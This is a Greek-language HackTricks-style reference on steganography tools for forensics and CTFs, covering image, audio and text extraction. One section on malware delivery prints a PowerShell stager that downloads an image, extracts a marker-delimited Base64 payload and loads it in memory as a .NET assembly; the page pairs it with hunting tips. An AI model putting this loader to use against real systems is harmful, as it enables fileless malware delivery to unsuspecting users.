# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **Εξαγωγή Δεδομένων από Αρχεία**

### **Binwalk**

Ένα εργαλείο για την αναζήτηση σε δυαδικά αρχεία για ενσωματωμένα κρυφά αρχεία και δεδομένα. Εγκαθίσταται μέσω `apt` και ο πηγαίος κώδικάς του είναι διαθέσιμος στο [GitHub](https://github.com/ReFirmLabs/binwalk).
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

Ανακτά αρχεία με βάση τις κεφαλίδες και τα υποσέλιδα, χρήσιμο για εικόνες png. Εγκαθίσταται μέσω `apt` και ο πηγαίος κώδικάς του βρίσκεται στο [GitHub](https://github.com/korczis/foremost).
```bash
foremost -i file # Extracts data
```
### **Exiftool**

Βοηθά στην προβολή των μεταδεδομένων αρχείων, διαθέσιμο [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

Παρόμοιο με το exiftool, για προβολή μεταδεδομένων. Εγκαθίσταται μέσω `apt`, ο πηγαίος κώδικας στο [GitHub](https://github.com/Exiv2/exiv2), και διαθέτει [official website](http://www.exiv2.org/).
```bash
exiv2 file # Shows the metadata
```
### **File**

Προσδιορίστε τον τύπο του αρχείου με το οποίο έχετε να κάνετε.

### **Strings**

Εξάγει αναγνώσιμες συμβολοσειρές από αρχεία, χρησιμοποιώντας διάφορες ρυθμίσεις κωδικοποίησης για να φιλτράρει την έξοδο.
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Σύγκριση (cmp)**

Χρήσιμο για τη σύγκριση ενός τροποποιημένου αρχείου με την αρχική του έκδοση που βρίσκεται στο διαδίκτυο.
```bash
cmp original.jpg stego.jpg -b -l
```
## **Εξαγωγή κρυφών δεδομένων από κείμενο**

### **Κρυφά δεδομένα στα κενά**

Αόρατοι χαρακτήρες σε φαινομενικά κενά ενδέχεται να κρύβουν πληροφορίες. Για να εξαγάγετε αυτά τα δεδομένα, επισκεφθείτε [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **Εξαγωγή δεδομένων από εικόνες**

### **Αναγνώριση λεπτομερειών εικόνας με GraphicMagick**

[GraphicMagick](https://imagemagick.org/script/download.php) χρησιμοποιείται για τον προσδιορισμό του τύπου αρχείων εικόνας και τον εντοπισμό πιθανής διαφθοράς. Εκτελέστε την παρακάτω εντολή για να εξετάσετε μια εικόνα:
```bash
./magick identify -verbose stego.jpg
```
Για να επιχειρήσετε την επιδιόρθωση μιας κατεστραμμένης εικόνας, η προσθήκη ενός σχολίου μεταδεδομένων μπορεί να βοηθήσει:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide για Απόκρυψη Δεδομένων**

Το Steghide διευκολύνει την απόκρυψη δεδομένων μέσα σε `JPEG, BMP, WAV, and AU` αρχεία, έχοντας τη δυνατότητα ενσωμάτωσης και εξαγωγής κρυπτογραφημένων δεδομένων. Η εγκατάσταση είναι απλή με χρήση του `apt`, και [source code is available on GitHub](https://github.com/StefanoDeVuono/steghide).

**Εντολές:**

- `steghide info file` αποκαλύπτει αν ένα αρχείο περιέχει κρυμμένα δεδομένα.
- `steghide extract -sf file [--passphrase password]` εξάγει τα κρυμμένα δεδομένα — ο κωδικός προαιρετικός.

Για εξαγωγή μέσω web, επισκεφθείτε [this website](https://futureboy.us/stegano/decinput.html).

**Bruteforce Attack with Stegcracker:**

- Για να επιχειρήσετε password cracking σε Steghide, χρησιμοποιήστε [stegcracker](https://github.com/Paradoxis/StegCracker.git) ως εξής:
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg ειδικεύεται στην αποκάλυψη κρυφών δεδομένων σε αρχεία PNG και BMP. Η εγκατάσταση γίνεται μέσω `gem install zsteg`, με τον πηγαίο κώδικα στο [GitHub](https://github.com/zed-0xff/zsteg).

**Commands:**

- `zsteg -a file` εφαρμόζει όλες τις μεθόδους εντοπισμού σε ένα αρχείο.
- `zsteg -E file` καθορίζει ένα payload για εξαγωγή δεδομένων.

### **StegoVeritas and Stegsolve**

**stegoVeritas** ελέγχει τα μεταδεδομένα, πραγματοποιεί μετασχηματισμούς εικόνας και εφαρμόζει LSB brute forcing μεταξύ άλλων δυνατοτήτων. Χρησιμοποιήστε `stegoveritas.py -h` για πλήρη λίστα επιλογών και `stegoveritas.py stego.jpg` για εκτέλεση όλων των ελέγχων.

**Stegsolve** εφαρμόζει διάφορα φίλτρα χρώματος για να αποκαλύψει κρυμμένα κείμενα ή μηνύματα μέσα σε εικόνες. Είναι διαθέσιμο στο [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve).

### **FFT for Hidden Content Detection**

Οι τεχνικές Fast Fourier Transform (FFT) μπορούν να αποκαλύψουν κρυμμένο περιεχόμενο σε εικόνες. Χρήσιμοι πόροι περιλαμβάνουν:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy επιτρέπει την ενσωμάτωση πληροφοριών σε αρχεία εικόνας και ήχου, υποστηρίζοντας μορφές όπως PNG, BMP, GIF, WebP και WAV. Είναι διαθέσιμο στο [GitHub](https://github.com/dhsdshdhk/stegpy).

### **Pngcheck for PNG File Analysis**

Για ανάλυση αρχείων PNG ή για επαλήθευση της αυθεντικότητάς τους, χρησιμοποιήστε:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **Επιπλέον Εργαλεία για Ανάλυση Εικόνων**

Για περαιτέρω διερεύνηση, επισκεφθείτε:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## Marker-delimited Base64 payloads hidden in images (malware delivery)

Commodity loaders κρύβουν όλο και περισσότερο Base64-encoded payloads ως plain text μέσα σε κατά τα άλλα έγκυρες images (συχνά GIF/PNG). Αντί για pixel-level LSB, το payload οριοθετείται από μοναδικά start/end marker strings ενσωματωμένα στο file text/metadata. Ένας PowerShell stager στη συνέχεια:
- Κατεβάζει το image μέσω HTTP(S)
- Εντοπίζει τα marker strings (παρατηρημένα παραδείγματα: <<sudo_png>> … <<sudo_odt>>)
- Εξάγει το κείμενο μεταξύ των markers και κάνει Base64-decode σε bytes
- Φορτώνει το .NET assembly in-memory και καλεί μια γνωστή entry method (χωρίς αρχείο να γράφεται στο δίσκο)

Minimal PowerShell carving/loading snippet
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
Σημειώσεις
- Αυτό εμπίπτει στο ATT&CK T1027.003 (steganography). Οι συμβολοσειρές δεικτών διαφέρουν μεταξύ των εκστρατειών.
- Hunting: σαρώστε τις κατεβασμένες εικόνες για γνωστούς διαχωριστές· επισημάνετε `PowerShell` που χρησιμοποιεί `DownloadString` ακολουθούμενο από `FromBase64String`.

Δείτε επίσης παραδείγματα παράδοσης phishing και την πλήρη ροή εκτέλεσης στη μνήμη εδώ:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **Εξαγωγή Δεδομένων από Ηχητικά Αρχεία**

**Audio steganography** προσφέρει μια μοναδική μέθοδο για την απόκρυψη πληροφοριών μέσα σε αρχεία ήχου. Χρησιμοποιούνται διάφορα εργαλεία για την ενσωμάτωση ή την ανάκτηση κρυφού περιεχομένου.

### **Steghide (JPEG, BMP, WAV, AU)**

Steghide είναι ένα ευέλικτο εργαλείο σχεδιασμένο για την απόκρυψη δεδομένων σε αρχεία JPEG, BMP, WAV και AU. Αναλυτικές οδηγίες παρέχονται στο [stego tricks documentation](stego-tricks.md#steghide).

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

Αυτό το εργαλείο είναι συμβατό με διάφορες μορφές, συμπεριλαμβανομένων των PNG, BMP, GIF, WebP και WAV. Για περισσότερες πληροφορίες, ανατρέξτε στην [Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav).

### **ffmpeg**

Το ffmpeg είναι κρίσιμο για την αξιολόγηση της ακεραιότητας των αρχείων ήχου, παρέχοντας λεπτομερείς πληροφορίες και εντοπίζοντας τυχόν αποκλίσεις.
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavSteg υπερέχει στην απόκρυψη και εξαγωγή δεδομένων μέσα σε αρχεία WAV χρησιμοποιώντας τη στρατηγική του least significant bit. Είναι διαθέσιμο στο [GitHub](https://github.com/ragibson/Steganography#WavSteg). Οι εντολές περιλαμβάνουν:
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound επιτρέπει την κρυπτογράφηση και την ανίχνευση πληροφοριών μέσα σε αρχεία ήχου χρησιμοποιώντας AES-256. Μπορεί να ληφθεί από [the official page](http://jpinsoft.net/deepsound/download.aspx).

### **Sonic Visualizer**

Εργαλείο ανεκτίμητης αξίας για οπτική και αναλυτική επιθεώρηση αρχείων ήχου, το Sonic Visualizer μπορεί να αποκαλύψει κρυμμένα στοιχεία που δεν ανιχνεύονται με άλλους τρόπους. Επισκεφτείτε το [official website](https://www.sonicvisualiser.org/) για περισσότερα.

### **DTMF Tones - Dial Tones**

Η ανίχνευση τόνων DTMF σε αρχεία ήχου μπορεί να πραγματοποιηθεί με διαδικτυακά εργαλεία όπως [this DTMF detector](https://unframework.github.io/dtmf-detect/) και [DialABC](http://dialabc.com/sound/detect/index.html).

## **Άλλες Τεχνικές**

### **Binary Length SQRT - QR Code**

Δυαδικά δεδομένα των οποίων το μήκος είναι τέλειος τετράγωνος αριθμός μπορεί να αντιπροσωπεύουν ένα QR code. Χρησιμοποιήστε αυτό το απόσπασμα για να το ελέγξετε:
```python
import math
math.sqrt(2500) #50
```
Για μετατροπή από binary σε εικόνα, δείτε το [dcode](https://www.dcode.fr/binary-image). Για ανάγνωση QR codes, χρησιμοποιήστε [this online barcode reader](https://online-barcode-reader.inliteresearch.com/).

### **Μετάφραση Braille**

Για μετάφραση Braille, ο [Branah Braille Translator](https://www.branah.com/braille-translator) είναι εξαιρετικός πόρος.

## **Αναφορές**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
